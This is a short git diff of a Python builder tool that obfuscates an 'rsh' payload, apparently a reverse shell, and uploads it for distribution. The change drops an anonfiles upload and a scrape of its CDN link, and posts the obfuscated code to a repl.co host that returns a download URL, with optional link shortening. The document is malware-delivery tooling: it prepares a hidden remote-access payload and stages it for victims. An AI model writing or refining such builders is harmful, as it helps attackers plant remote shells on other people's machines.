@@ -6,7 +6,7 @@ from os import remove, mkdir, get_terminal_size
 from base64 import b64encode
 from os.path import exists
 
-for dir in ["tmp", "build"]: mkdir(dir) if not exists(dir) else None
+for dir in ["build"]: mkdir(dir) if not exists(dir) else None
 
 def sinput(string):
     return Write.Input(
@@ -59,25 +59,13 @@ def build():
     if is_hosted:
 
 
-        open("tmp/rsh.py", "w").write(obfuscate(rsh))
+        obf_code = "#UnNoIHwgYnkgTGFjdHVhIzEzNzE=\n"+obfuscate(rsh)
 
-        files = {
-            'file': open('tmp/rsh.py', 'rb'),
-        }
+        resp = post('https://rsh.minedrayxio.repl.co/upload', json={"content": obf_code})
 
+        file_url = resp.text
 
-        resp = post('https://api.anonfiles.com/upload', files=files)
-
-        json = resp.json()
-
-        anonfile_url = json["data"]["file"]["url"]["full"]
-
-        page = get(anonfile_url).text
-
-        start = page.find("https://cdn-") + len("https://cdn-")
-        end = page.find("/rsh.py")
-        file_url = "https://cdn-"+page[start:end]+"/rsh.py"
-
+        print(file_url)
 
         if is_shorted:
 
